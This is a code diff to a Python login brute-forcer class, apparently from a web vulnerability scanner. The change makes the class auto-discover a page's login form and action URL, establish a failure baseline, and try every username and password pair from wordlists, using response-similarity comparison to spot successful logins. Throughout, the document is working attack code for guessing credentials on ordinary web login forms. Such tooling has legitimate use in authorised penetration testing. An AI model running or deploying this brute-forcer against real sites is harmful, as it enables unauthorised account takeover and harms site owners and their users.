@@ -1,108 +1,94 @@
 import random
 import string
+import difflib
+from urllib.parse import urljoin
 from utils.http_client import HttpClient
 from utils.reporter import Reporter
 from utils.form_parser import get_forms
 
 
 class LoginBruteforcer:
-
     def __init__(self, http_client: HttpClient, reporter: Reporter, config: dict):
         self.client = http_client
         self.reporter = reporter
-        self.url = config['url']
-        self.user_param = config.get('user_param')
-        self.pass_param = config.get('pass_param')
+        self.form_page_url = config['url']  #The URL where the form is located
+        self.user_param_name = config.get('user_param')
+        self.pass_param_name = config.get('pass_param')
+        self.action_url = None  #The URL where we will submit the data
         self.USERNAME_KEYWORDS = ['user', 'login', 'email', 'uname', 'username', 'log']
-        self.failure_string = config.get('failure_string')
+        self.SIMILARITY_THRESHOLD = 0.95
 
-    def _find_login_form_fields(self):
+    def initialize(self):
         """
-        Automatically finds the login and password field names in a form.
-        Returns a tuple (user_field_name, pass_field_name) or (None, None) on failure.
+        Finds the login form, its action URL, and field names.
+        This must be called before running the attack.
         """
-        print("[*] Attempting to auto-discover form parameters...")
-        forms = get_forms(self.client, self.url)
+        print("[*] Initializing bruteforcer: finding login form and action URL...")
+        forms = get_forms(self.client, self.form_page_url)
+        if not forms:
+            print("❌ No forms found on the page.")
+            return False
+
         for form in forms:
-            pass_field = None
-            user_field = None
-
-            #Find the password field first, it's the most reliable indicator
+            pass_field, user_field = None, None
             for field in form['inputs']:
                 if field.get('type') == 'password':
                     pass_field = field.get('name')
-                    break  # Found it, no need to look further in this form
-
-            #If a password field was found, look for a username field in the same form
+                    break
             if pass_field:
                 for field in form['inputs']:
                     field_name = field.get('name')
-                    if field.get('type') in ['text', 'email', 'tel'] or not field.get('type'):
-                        if field_name:
-                            for keyword in self.USERNAME_KEYWORDS:
-                                if keyword in field_name.lower():
-                                    user_field = field_name
-                                    print(
-                                        f"[*] Auto-discovery successful! Found user param: '{user_field}', pass param: '{pass_field}'")
-                                    return (user_field, pass_field)
+                    if field.get('type') in ['text', 'email'] or not field.get('type'):
+                        if field_name and any(keyword in field_name.lower() for keyword in self.USERNAME_KEYWORDS):
+                            user_field = field_name
 
-        print("Auto-discovery failed. Please provide parameters manually using --user-param and --pass-param.")
-        return (None, None)
+                            self.action_url = form['action']
+                            self.user_param_name = self.user_param_name or user_field
+                            self.pass_param_name = self.pass_param_name or pass_field
+                            print(f"[*] Form found! Submitting to: {self.action_url}")
+                            print(
+                                f"[*] Using User Param: '{self.user_param_name}', Pass Param: '{self.pass_param_name}'")
+                            return True
 
-    def _get_failure_baseline(self):
-        """
-        Sends a request with deliberately invalid credentials to establish a
-        "failure baseline" tuple: (content_length, redirect_count).
-        """
+        print("❌ Could not auto-discover a likely login form.")
+        return False
+
+    def _get_failure_baseline_content(self):
+        """Gets the content of a failed login attempt by submitting to the correct action_url."""
         print("[*] Establishing a failure baseline...")
-        #Generate long, random strings that are highly unlikely to be valid
         random_user = ''.join(random.choice(string.ascii_lowercase) for i in range(15))
         random_pass = ''.join(random.choice(string.ascii_lowercase) for i in range(15))
-        payload = {self.user_param: random_user, self.pass_param: random_pass}
+        payload = {self.user_param_name: random_user, self.pass_param_name: random_pass}
 
         try:
-            response = self.client.session.post(self.url, data=payload)
-            #capturing a tuple of characteristics as our baseline
-            baseline = (len(response.content), len(response.history))
-            print(f"[*] Baseline established. Length: {baseline[0]} bytes, Redirects: {baseline[1]}")
-            return baseline
+            #submit to the action url, not the form url
+            response = self.client.session.post(self.action_url, data=payload)
+            print(f"[*] Baseline established. Failure page content captured.")
+            return response.text
         except Exception as e:
             print(f"[!] Critical error while establishing baseline: {e}")
             return None
 
-    def _try_login(self, username, password, baseline):
-        """Attempts a login and uses anomaly detection"""
-        baseline_length, baseline_redirects = baseline
-        payload = {self.user_param: username, self.pass_param: password}
+    def _try_login(self, username, password, baseline_html):
+        """Attempts a login and compares the response content to the baseline."""
+        payload = {self.user_param_name: username, self.pass_param_name: password}
         try:
-            response = self.client.session.post(self.url, data=payload)
-            current_length = len(response.content)
-            current_redirects = len(response.history)
-            if current_length != baseline_length or current_redirects != baseline_redirects:
-                return True
-        except Exception:
-            pass
-        return False
-
-    def _try_login_by_string(self, username, password):
-        """Attempts a login and checks for the absence of a failure string"""
-        payload = {self.user_param: username, self.pass_param: password}
-        try:
-            response = self.client.session.post(self.url, data=payload)
-            if self.failure_string.lower() not in response.text.lower():
+            #submit to the action url
+            response = self.client.session.post(self.action_url, data=payload)
+            similarity_ratio = difflib.SequenceMatcher(a=baseline_html, b=response.text).ratio()
+            if similarity_ratio < self.SIMILARITY_THRESHOLD:
                 return True
         except Exception:
             pass
         return False
 
     def run_attack(self, user_list_path, pass_list_path):
-        """Runs the brute-force attack using the appropriate detection method"""
+        """Runs the brute-force attack."""
+        if not self.initialize():
+            return None  #Abort if we couldn't find the form details
 
-        #Auto-discover params if needed
-        if not self.user_param or not self.pass_param:
-            self.user_param, self.pass_param = self._find_login_form_fields()
-        if not self.user_param or not self.pass_param:
-            return None
+        baseline_html = self._get_failure_baseline_content()
+        if baseline_html is None: return None
 
         #Load wordlists
         try:
@@ -114,26 +100,14 @@ class LoginBruteforcer:
             print(f"❌ ERROR: Could not find wordlist file: {e}")
             return None
 
-        #Decide which mode to use
-        if self.failure_string:
-            print("[*] Starting string-matching based login brute-force attack...")
-            attack_logic = lambda u, p: self._try_login_by_string(u, p)
-        else:
-            print("[*] Starting anomaly-based login brute-force attack...")
-            baseline = self._get_failure_baseline()
-            if baseline is None:
-                print("Could not establish a failure baseline. Aborting attack.")
-                return None
-            attack_logic = lambda u, p: self._try_login(u, p, baseline)
-
         print(f"[*] Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
         print(f"[*] Total attempts to make: {len(usernames) * len(passwords)}")
 
         for username in usernames:
             for password in passwords:
                 print(f"[*] Trying: {username}:{password}", end='\r')
-                if attack_logic(username, password):
-                    success_message = f"\nSuccess! Potential credentials found: {username}:{password}"
+                if self._try_login(username, password, baseline_html):
+                    success_message = f"\n✅ SUCCESS (CONTENT ANOMALY)! Potential credentials: {username}:{password}"
                     print(success_message, " " * 20)
                     self.reporter.log_raw('login_bruteforcer', {"found_credentials": success_message})
                     return (username, password)
